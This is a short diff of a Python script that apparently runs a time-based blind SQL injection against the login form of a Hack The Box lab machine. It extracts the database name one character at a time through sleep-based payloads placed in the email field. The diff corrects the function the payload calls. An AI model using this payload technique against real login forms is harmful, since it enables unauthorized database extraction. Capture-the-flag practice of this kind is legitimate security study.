@@ -78,7 +78,7 @@ print("Base de datos actual: ")
 resultado = ""
 for pos in range(20):
     for letra in caracteres:
-        sqli = "' and if(substr(resultado()," + str(pos) + ",1)='" + letra + "',sleep(2),1)-- -"
+        sqli = "' and if(substr(database()," + str(pos) + ",1)='" + letra + "',sleep(2),1)-- -"
         data = { "email": "admin@europacorp.htb" + sqli, "password":"test"}
         inicio = time.time()
         req = requests.post(login_url, data=data, headers = headers, verify=False)
